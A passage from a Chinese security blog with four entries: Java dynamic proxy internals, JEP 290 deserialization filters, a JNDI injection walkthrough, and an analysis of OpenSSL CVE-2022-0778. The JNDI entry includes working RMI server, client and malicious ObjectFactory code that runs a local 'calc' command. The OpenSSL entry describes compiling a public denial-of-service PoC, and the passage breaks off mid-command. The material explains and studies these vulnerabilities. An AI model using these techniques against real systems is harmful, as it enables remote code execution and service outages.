<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.dynamicproxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyInterfaceImpl</span> <span class="keyword">implements</span> <span class="title class_">ProxyInterface</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;my name is armandhe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后定义我们的InnovcationHandler实例，这里我把调用类写在一起了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.dynamicproxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ProxyInterfaceImpl</span> <span class="variable">proxyInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyInterfaceImpl</span>();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ProxyInterface.class.getClassLoader();</span><br><span class="line">        <span class="type">ProxyInterface</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (ProxyInterface) Proxy.newProxyInstance(classLoader, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ProxyInterface.class&#125;, <span class="keyword">new</span> <span class="title class_">DynamicProxyHandler</span>(proxyInterface));</span><br><span class="line">        proxyInstance.printName();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DynamicProxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object proxyedClass;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DynamicProxyHandler</span><span class="params">(Object proxyedClass)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.proxyedClass =proxyedClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;添加的前置内容&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method.invoke(proxyedClass, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;添加的前置内容&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里注意到我们定义的处理器必须实现InvocationHandler, Serializable两个接口，一个是处理器，一个是反序列化标识，然后我们还得重写其invoke方法。</p>
<p>现在万事俱备只欠东风，我们直接打断点开始调试<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1c72682141efd09ea30c0cc201201a5a.png" alt="在这里插入图片描述"><br>在java.lang.reflect.Proxy#newProxyInstance方法中首先通过java.lang.reflect.Proxy#getProxyClass0方法获取一个Proxy 的Class实例，然后传入一个Innovacation的Class实例对象获取到对应的构造方法，最后利用反射调用获取到一个我们被代理类的Proxy类实例。<br>所以我们代理类的所有生成逻辑都在getProxyClass0这个方法中<br>该方法首先会从proxyClassCache缓存中检查被代理类的代理类实例是否已经生成了，如果生成则直接返回该实例，否则会调用subKeyFactory.apply方法获取subkey(干啥的没看懂)，然后生成一个Factory（只有一些赋值操作），然后判断supplier是否为空，如果为空则继续循环，并为其赋值为factory，这时候其就不为空了然后会调用到supplier.get()方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5511f43bd8c13aadcfc270ddea84d371.png" alt="在这里插入图片描述"><br>这里首先还是检查subkey是否有缓存，这时候很明显是有的且返回一个supplier对象，上面提到了会将Factory赋值为supplier，所以第一个判断假，直接到断点处，会调用valueFactory.apply，valueFactory为一个ProxyClassFactory对象。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e61a4eddece2289449391e21268b45aa.png" alt="在这里插入图片描述"><br>这里直接获取了当前接口的Class实例<br><img src="https://i-blog.csdnimg.cn/blog_migrate/687766e458077b567aa3400cb1839c39.png" alt="在这里插入图片描述"><br>这里设置了生成的代理类的包名<br><img src="https://i-blog.csdnimg.cn/blog_migrate/90fcd9add1996c0b47973552b627d1a4.png" alt="在这里插入图片描述"><br>这里设置类代理类的全类名，可以观察导生成的代理类类名已$Proxy加一个数字开头，数字是递增的以我们传入的接口数为准<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3b46db8cb6bfd2dbb37bf90036a80fcd.png" alt="在这里插入图片描述"><br>然后会调用sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[], int)生成代理类的字节码文件，这里面全是直接操作字节码，实在牛皮，然后调用java.lang.reflect.Proxy#defineClass0链接类完成类加载，defineClass0是一个本地方法，熟悉java类架子应该知道，在默认的类加载器中也是使用的该方法链接类。
![在这里插入图片描述](https://img-blog.csdnimg.cn/18f2ec10dc1b4cebb1b6e4f756b015e0.png)
sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[], int)首先在加载过程中就完成了代理类的生成，这很明显是一个饿汉式的单例模式。调用构造方法就进行了一些赋值操作。<br>然后调用sun.misc.ProxyGenerator#generateClassFile方法最终实现类加载，然后会saveGeneratedFiles是否保存生成的代理类文件，这个值通过设置系统属性<code>sun.misc.ProxyGenerator.saveGeneratedFiles</code>设置</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/86685f77e38e00e4beaa67adc6cd26a4.png" alt="在这里插入图片描述"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1ec4f936c87115d5652fdcaeaafc6c13.png" alt="在这里插入图片描述"><br>从上到下一次完成将hashcode equals toString方法添加到proxyMethods中，将代理方法添加到sigmethods中<br>将被代理类方法加入到proxyMethods中<br>校验方法返回值类型<br>添加构造方法<br>然后就是一波操作字节码的逆天操作。。。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>动态代理</tag>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>JEP 290 初识</title>
    <url>/archives/fe14a293.html</url>
    <content><![CDATA[<p>JEP 290是 oracle提供已一套JAVA反序列化机制，其并不是一种必须被强制执行的策略，而是需要程序员或者运维人员进行开发与启用。关于该机制的优缺点借用老外的一篇文章</p>
<span id="more"></span>
<blockquote>
<p><a href="https://dzone.com/articles/a-first-look-into-javas-new-serialization-filterin">https://dzone.com/articles/a-first-look-into-javas-new-serialization-filterin</a></p>
</blockquote>
<p>中文版可以参考</p>
<blockquote>
<p><a href="https://blog.csdn.net/caiqiiqi/article/details/104270776">https://blog.csdn.net/caiqiiqi/article/details/104270776</a></p>
</blockquote>
<p>该机制提供了三种防御策略，分别是全局过滤器、自定义过滤器以及内置过滤器</p>
<h1 id="全局过滤器"><a href="#全局过滤器" class="headerlink" title="全局过滤器"></a>全局过滤器</h1><p>该过滤器可以通过三种方法进行启用，</p>
<ol>
<li>启动应用时通过指定参数<code>-Djdk.serialFilter=&lt;白名单类1&gt;;&lt;白名单类2&gt;;!&lt;黑名单类&gt;</code></li>
<li>设置环境变量<code>$JAVA_HOME/jre/lib/security/java.security</code></li>
<li>启动时指定策略文件<code>-Djava.security.properties=&lt;黑白名单配置文件名&gt;</code><br>关于java.security文件提供了主要提供了两种策略，一种是限制类调用的深度与数量，二是通过黑白名单进行限制<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e3f3f807e34ba0d1132c7dd37ffd14f.png" alt="在这里插入图片描述"></li>
</ol>
<h1 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h1><p>程序员可在编码是使用<code>ObjectInputStreamFilter</code>指定反序列化黑白名单<br><code>ObjectInputFilter filesOnlyFilter = ObjectInputFilter.Config.createFilter(&quot;de.mogwailabs.Example;!*&quot;);</code></p>
<h1 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h1><p>其实第一张图里面就是一些内置过滤器，当然截图不全，如果要启动去掉注释即可</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>JEP 290</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入再理解</title>
    <url>/archives/29b6e7bf.html</url>
    <content><![CDATA[<p>嗯，感觉以前对这个概念的理解不是很清楚，今天抽了时间再学习了学习。</p>
<p>JNDI提供了一个统一的接口屏蔽了一些协议负载的调用与使用过程，如RMI、LDAP、COBRA等，主要功能是实现了远程方法调用，针对JNID的攻击一般有以下两种，一种是注册在远程的对象由一些危险的方法，那么我们便可以直接使用注册中兴对外暴露的接口调用这些危险的方法来实现攻击，一类是我们可以直接在客户端向注册中心直接注册一个恶意对象，因为对象在传输过程中时序列化传输的，那么注册中心再加载该对象的时候会进行反序列化操作，那么如果我们的恶意对象的静态代码块中有一些危险操作那么便会直接被执行，因为静态代码块中的方法是在类加载过程中被调用的，且只会调用一次。<br>关于第一种情况，没什么好说的，只要我们能够远程调用接口便能完成攻击，当然是在你知道对方注册了什么危险对象的基础上。第二种情况也分多种情况，一是我们可以直接向远程注册恶意对象。二是我们可以利用JNDI的动态类加载机制完成攻击，一是利用CodeBase机制，如果客户端的lookup参数内容可控，那么我们便可以自行搭建一个注册中心，注册恶意类。那么客户端在调用的时候就会调用到我们的恶意对象，但是这有一个问题，如果是我们自行注册的恶意对象，那么客户端如果没有这个恶意类，客户端也是不会反序列化成功的，利用CodeBase机制我们可以在服务端指定恶意类的加载地址，当客户端请求该恶意对象的时候，客户端会一并将CodeBase指定的地址发送个客户端，如果客户端没有这个恶意类那么则会使用CodeBase指定的地址去加载恶意类，从而完成恶意类的自动调用。这里注意CodeBase是双向指定的，客户端可以指定，服务端也可以指定，当然优先使用的是服务端指定的地址。麻烦的是一些版本的JDK模式不允许CodeBase远程类加载，而且还涉及到java的安全管理器。另一种情况是利用JNDI Naming Reference，Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用，如果注册在注册中心的对象为Reference类的子类，那么再客户端获取到远程对象的存根实例的时候将使用Reference对象指定的远程地址与类名去加载恶意类从而完成攻击，可以注意到，这个攻击发生在客户端。因为Reference没有继承UnicastRemoteObject，所以我们需要对Reference类使用ReferenceWrapper对其进行包装，然后绑定在注册中心中才能实现远程调用。两种情况重点都是需要lookup函数参数可控，也就是可以指定远程服务器的位置，当然你如果可以操控对方远程服务器又另说。<br>这里我们介绍一下通过Reference类来实现JNDI注入，首先我们写一个客户端。</p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lookup</span> <span class="operator">=</span> initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);</p>
</blockquote>
<p>这一行代码是为了避免高版本的JDK值允许在指定位置加载类的特性<br>然后我们写一个服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.armandhe.jnditest.EvilClass&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;file://E:\\securityTools\\源码\\jnditest\\src\\main\\java\\com\\armandhe\\jnditest\\EvilClass.class&quot;</span>;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className, className, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;hacked&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1/hacked is working...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>服务端就不起http服务器了，我们通过file协议将远程类的地址设置为本地文件系统，因为我的客户端与服务器在同一台机器上，所以这样也是可以的，然后声明一个注册中心，绑定一个端口，实例化一个Reference类，使用ReferenceWrapper对其进行包装，因为其继承了UnicastRemoteObject类，这样我们的Reference才能被远程调用<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3f4e96c56945648fc75944c7e79c003f.png" alt="在这里插入图片描述"></p>
<p>然后是我们的恶意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在该类中我们集成了ObjectFactory类，重写了其getObjectInstance方法。<br>然后讲服务端与客户端分别运行起来，然后打断点进行调试<br><img src="https://i-blog.csdnimg.cn/blog_migrate/92ca44c08af8d3f8f8dc95bcbb1dc7f0.png" alt="在这里插入图片描述"><br>首先调用的是InitialContext#lookup方法，该方法首先调用了其静态方法getURLOrDefaultIniCtx，获取了一个Context对象，该Context对象是GenericURLContext类的一个实例，然后调用其lookup方法，出入jndi表达式<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dd088615137ff86c90161159605ab82d.png" alt="在这里插入图片描述"><br>然后继续往下走进入到RegistryContext#lookup方法，该方法会调用decodeObject方法对远程对象进行解析，该方法接收两个参数，一个是我们远程获取的ReferenceWrapper对象，一个是我们的查询name，也就是hacked<br><img src="https://i-blog.csdnimg.cn/blog_migrate/664327f269b07c14eda517690151d4be.png" alt="在这里插入图片描述"><br>方法体重首先会判断我们传入的对象是否是RemoteReference与Reference类的实例，然后进行强制类型转换为Reference对象，判断是否设置了远程类的位置，以及该地址是否是可信的CodeBase地址，这也是为什么我们最开始要设置com.sun.jndi.rmi.object.trustURLCodebase为true的原因，否则是不可能调用成功的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2ad184a640746724ee37cfee2f712d44.png" alt="在这里插入图片描述"><br>方法体最终会调用NamingManager#getObjecInstance方法，传入我们的Reference对象与name</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9632a133680faef2d9e3996b90079db5.png" alt="在这里插入图片描述"><br>该方法中重点在第330行与332行，在330行调用getObjectFactoryFromReference闯入Reference对象与f，f就是我们的恶意类的全类名，该方法中或实例化我们的恶意类。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3cecb586e66ba61b934f8750f559d30.png" alt="在这里插入图片描述"><br>首先是在第148行获取了我们恶意类的Class对象，然后通过反射的方式对该类进行了实例化，所以我们的恶意类的恶意代码可以写在静态代码块、实例代码块、无参构造方法中。熟悉java类加载机制的都清楚，java的类夹杂核心方法为loadClass、defineClass、findClass，这已经很明显了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e380d2e8ab633810450f2c701af429e.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/9b8b0f55bc77487f1ae605af4c268efe.png" alt="在这里插入图片描述"><br>getObjectFactoryFromReference方法执行完成后会获得我们自定义的ObjectFactory对象，让后调用该对象的getObjectInstance方法，这也是我们的恶意代码可以写在该方法中的原因。<br>所以你注意到了吗，这种方式是不能绕过高版本JDK的trustURLCodebase机制的，所以有局限，那么要如何在高版本JDK使用这种方式注入呢，相比你已经很清楚了，我们之所以需要使用CodeBase是因为我们要加载的远程类在本地不存在，那么如果在客户端测存在我们要使用的恶意类不就完美的避免了CodeBase的保护机制了吗？所以我们下一章就去找一找这个tomcat或者JDK本地的危险Gadget</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>OPENSSL拒绝服务漏洞【CVE-2022-0778】</title>
    <url>/archives/9df09993.html</url>
    <content><![CDATA[<p>@<a href="OPENSSL%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E3%80%90CVE-2022-0778%E3%80%91">TOC</a><br>废话不多说直接去看官方github的commit记录</p>
<blockquote>
<p><a href="https://github.com/openssl/openssl/commit/9eafb53614bf65797db25f467946e735e1b43dc9#">https://github.com/openssl/openssl/commit/9eafb53614bf65797db25f467946e735e1b43dc9#</a></p>
</blockquote>
<p>大哥的分析</p>
<blockquote>
<p><a href="https://github.com/drago-96/CVE-2022-0778">https://github.com/drago-96/CVE-2022-0778</a></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6d04198c4c9adbc441822eae0020f4.png" alt="在这里插入图片描述"><br>整个文件对应了函数BN_mod_sqrt，该函数接受4个参数，按照顺序我们称为ret,a,p,ctx，函数最终的实现效果是利用Tonelli&#x2F;Shanks算法计算ret，Tonelli&#x2F;Shanks算法是用来结算二次剩余的一种算法，关于二次剩余解释为存在一个数X的平方与n mod p同余，则称n为模p的二次剩余。<br>这个洞太考验数学了，对我这种半路出家的渣渣来说后面的数学推导过程真的是不要太难受。<br>关键的修改发生在这一部分<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ad2eaaabb25b582db330640d8d146f5b.png" alt="在这里插入图片描述"><br>这一部分代码被包裹在一个大的循环里面，这里贴出来完整的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/*-</span></span><br><span class="line"><span class="comment">         * Now  b  is  a^q * y^k  for some even  k  (0 &lt;= k &lt; 2^E</span></span><br><span class="line"><span class="comment">         * where  E  refers to the original value of  e,  which we</span></span><br><span class="line"><span class="comment">         * don&#x27;t keep in a variable),  and  x  is  a^((q+1)/2) * y^(k/2).</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * We have  a*b = x^2,</span></span><br><span class="line"><span class="comment">         *    y^2^(e-1) = -1,</span></span><br><span class="line"><span class="comment">         *    b^2^(e-1) = 1.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (BN_is_one(b)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!BN_copy(ret, x))</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            err = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> vrfy;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* find smallest  i  such that  b^(2^i) = 1 */</span></span><br><span class="line">        <span class="comment">/***********修改前的代码***********/</span></span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_sqr(t, b, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">while</span> (!BN_is_one(t)) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span> (i == e) &#123;</span><br><span class="line">                ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">         <span class="comment">/***********修改前的代码***********/</span></span><br><span class="line">        <span class="comment">/* Find the smallest i, 0 &lt; i &lt; e, such that b^(2^i) = 1. */</span></span><br><span class="line">        <span class="comment">/***********修改后的代码***********/</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; e; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!BN_mod_sqr(t, b, p, ctx))</span><br><span class="line">                    <span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!BN_mod_mul(t, t, t, p, ctx))</span><br><span class="line">                    <span class="keyword">goto</span> end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!BN_mod_mul(t, t, t, p, ctx))</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            <span class="keyword">if</span> (BN_is_one(t))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/***********修改后的代码***********/</span></span><br><span class="line">        <span class="comment">/* If not found, a is not a square or p is not prime. */</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt;= e) &#123;</span><br><span class="line">            ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* t := y^2^(e - i - 1) */</span></span><br><span class="line">        <span class="keyword">if</span> (!BN_copy(t, y))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">for</span> (j = e - i - <span class="number">1</span>; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!BN_mod_sqr(t, t, p, ctx))</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_mul(y, t, t, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_mul(x, x, t, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_mul(b, b, y, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        e = i;</span><br><span class="line">    &#125;</span><br><span class="line"> vrfy:</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * verify the result -- the input might have been not a square (test</span></span><br><span class="line"><span class="comment">         * added in 0.9.8)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!BN_mod_sqr(x, ret, p, ctx))</span><br><span class="line">            err = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!err &amp;&amp; <span class="number">0</span> != BN_cmp(x, A)) &#123;</span><br><span class="line">            ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">            err = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> end:</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ret != in)</span><br><span class="line">            BN_clear_free(ret);</span><br><span class="line">        ret = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (used_ctx)</span><br><span class="line">        BN_CTX_end(ctx);</span><br><span class="line">    bn_check_top(ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们直接来看修改前的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">.....</span><br><span class="line">	i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (!BN_mod_sqr(t, b, p, ctx))</span><br><span class="line">	    <span class="keyword">goto</span> end;</span><br><span class="line">	<span class="keyword">while</span> (!BN_is_one(t)) &#123;</span><br><span class="line">	    i++;</span><br><span class="line">	    <span class="keyword">if</span> (i == e) &#123;</span><br><span class="line">	        ERR_raise(ERR_LIB_BN, BN_R_NOT_A_SQUARE);</span><br><span class="line">	        <span class="keyword">goto</span> end;</span><br><span class="line">  ....</span><br><span class="line">    <span class="keyword">if</span> (!BN_mod_mul(b, b, y, p, ctx))</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">     e = i;</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在外层循环中首先会给i赋值为1，然后调用BN_mod_sqr函数，该函数的含义为接收一个素数p与数b计算t&#x3D;b^2 % p 如果计算成功则返回1，计算失败则返回0。如果没有计算成功就goto end直接退出循环，也就不会有拒绝服务的情况发生，当然我们需要让他正常返回计算结果。这是第一次外层循环需要满足的条件，然后调用BN_is_one函数判断t是否为1，如果此时t等于1那么就不会进入内层循环，而是直接到外层循环的底部将e的值赋为i，此时的i为1，也就是e为1，第一次外层循环最重要的工作也就是这一步为e赋值为1。这个时候我们就要想想怎么进入内层循环并让i&#x3D;&#x3D;e恒不成立就能使得程序一直在内层循环晃悠而不能退出，很明显需要满足BN_is_one函数的计算结果为False也就是t不等于1。进入第二次外层循环时当BN_mod_sqr计算结果使得t不为1时会进入内层循环，然后计算i++，此时i&#x3D;2 !&#x3D; e 也就不会进入内部的if语句，然后进入下一次内层循环，此时i再次自增，以后无论循环多少次都不会再有i&#x3D;1&#x3D;e的情况发生于是程序就在内层卡死了。那么现在需要实现的逻辑就是在第一次外层循环时使得t等于1，第二时不等于1，这么看来是不可能实现的除非b与p的值在后面的代码中发生了变化，不然不可能存在对相同的操作数操作两次结果不一样。恰好上面代码中使用了BN_mod_mul函数改变了b的值，每一次外层循环使用该函数时改变b的值，为b&#x3D;b<em>y mod p ，而y的值为 t</em>t mod p。<br>事情到了这里一切都已经明朗了起来，当然怎么找到符合条件的p和b的值是个问题，这里面的推导我看了存在大量的数学算法，直接给我整蒙了，查了一些资料也没有搞的很明白。<br>然后我去试了一下这个poc，发现确实有效，首先你的在你的设备上安装openssl，然后查看一下版本是不是存在漏洞<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f40147184694f737d314256d31a597f5.png" alt="在这里插入图片描述"><br>不好意思，好像有漏洞<br>然后你下载好poc，然后使用gcc编译<br><code>gcc -o my_bad_sqrt my_bad_sqrt.c -lcrypt</code><br>编译的过程中可能报错<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a7b556f84a26a0655a93482ea258ab2b.png" alt="在这里插入图片描述">centos执行<br><code>yum install 